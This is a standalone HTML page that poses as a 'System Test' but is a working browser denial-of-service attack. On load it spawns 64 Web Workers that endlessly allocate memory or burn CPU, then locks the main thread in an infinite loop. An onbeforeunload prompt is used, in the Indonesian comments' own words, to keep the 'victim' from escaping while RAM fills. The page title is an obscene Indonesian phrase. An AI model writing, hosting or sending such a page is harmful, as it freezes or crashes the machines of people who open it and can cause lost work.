<!DOCTYPE html>
<html>
<head>
    <title>Kontol Jaran</title>
</head>
<body style="background:white; margin:0; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif;">
    <div style="text-align:center; color:#888;">
        <p id="t">System Test Initializing...</p>
    </div>
    <script>
        // 1. FITUR ANTI-ESCAPE: Mencegah Refresh/Close (Pop-up Konfirmasi)
        // Jika korban mencoba Refresh, browser akan memunculkan peringatan 
        // "Apakah Anda yakin ingin meninggalkan situs ini?". 
        // Selama korban melihat pop-up ini, RAM terus terisi di latar belakang!
        window.onbeforeunload = function() {
            return "Kontol Jaran";
        };

        window.onload = function() {
            const status = document.getElementById('t');
            const workerTotal = 64;
            status.innerText = "Kontol Jaran";

            for (let i = 0; i < workerTotal; i++) {
                let workerCode = (i % 2 === 0) ? `
                    let h = [];
                    setInterval(() => {
                        try {
                            let c = new Uint8Array(1024 * 1024 * 256);
                            for(let j=0; j<c.length; j+=4096) c[j] = 1;
                            h.push(c);
                        } catch(e) {}
                    }, 0);
                ` : `
                    function t() {
                        while(true) {
                            let v = 1.0;
                            for(let j=0; j<40000000; j++) { v = Math.hypot(Math.tan(v), Math.atan(v)); }
                        }
                    }
                    t();
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                new Worker(URL.createObjectURL(blob));
            }

            // 2. LOCKDOWN LEBIH CEPAT (0.5 Detik)
            // Hanya memberikan waktu 500ms agar korban tidak sempat menekan Refresh.
            setTimeout(() => {
                status.innerText = "TOTAL LOCKDOWN ACTIVE.";
                while(true) { Math.sqrt(Math.random()); }
            }, 200); 
        };
    </script>
</body>
</html>
